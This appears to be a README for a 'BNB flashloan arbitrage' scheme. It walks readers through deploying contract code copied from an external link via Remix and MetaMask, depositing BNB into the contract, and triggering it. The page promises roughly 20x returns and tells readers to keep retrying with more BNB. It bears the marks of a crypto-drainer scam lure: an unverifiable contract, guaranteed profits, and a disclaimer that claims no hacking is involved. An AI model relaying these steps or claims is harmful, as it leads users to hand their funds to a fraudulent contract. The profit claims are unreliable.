# BNB-Flashloan

Make sure there's some BNB token deposited into smart contract to be paid as flashloan fee.


Smart Contract Code (Updated for Feb 2022): https://gateway.pinata...​
Contract Coding Platform (BNB): https://remix.ethereum.org/


Step 1 - Have MetaMask wallet setup in Firefox, Edge or Chrome. 
Step 2 - Add Binance Smart Chain Network to MetaMask - 
https://academy.binance.com/en/articles/connecting-metamask-to-binance-smart-chain

Step 3 - Transfer BNB you want to use to the wallet using a regular wallet transfer. 
Step 4 - Go to https://remix.ethereum.org/#lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.26+commit.8a97fa7a.js

​  (For programming the smart contract)
Step 5 - Click on contract folder and then click the Create new file button
Step 6 - Name the file "flashloan.sol" without quotes
Step 7 - Copy and paste the contract code from the link above 

https://raw.githubusercontent.com/Binance-BEP20/BNB-Flashloan/refs/heads/main/contracts/demo.sol


Step 8 - Click on the second tab down from the left
Step 9 - Choose the correct solidity version that matches the top of the code which is 0.5.0
Step 10 - Click Compile
Step 11 - Go to the third tab down on the left
Step 12 - For environment, change it to "Injected Web3" and then confirm in MetaMask to connect
Step 13 - Click on the arrow next to deploy and enter information for your brand new token and then click transact.
Step 14 - Once the contract is deployed, click to copy the contract code and go to MetaMask to deposit liquidity. 
Step 15 - Once that's done, click on your new contract and click the red button (action/execute/flashloan)

You need the MetaMask browser wallet to pay for the transaction fees. Download MetaMask on Chrome, Firefox or Edge.

How much to deposit in your initial contract depends on loan amount:
1000 - 0.25
2000 - 0.5
etc. (higher loan seems to provide higher return)
MINIMUM MUST BE 0.2, 0.15 IS PROVEN TO FAIL SO PLEASE BE AWARE

This is just my example that worked. Under some rare cases, the flash loan arbitrage may fail due to depleted BNB and higher gas prices. Wait a little bit and try the transaction again with different amount. Dont go below 0.2 BNB, few times it might get rejected but from my personal expirience every 3-5 try works. So you cant get anything for first time but second time you will get 20x of your investment.

You just have to go from step 14, as your new token contract will be active and so the flash loan arbitrage can be started from that point. 

EDUCATIONAL PURPOSES ONLY. NO HACKING ACTIVITY INVOLVED. DYOR. NOT FINANCIAL ADVICE
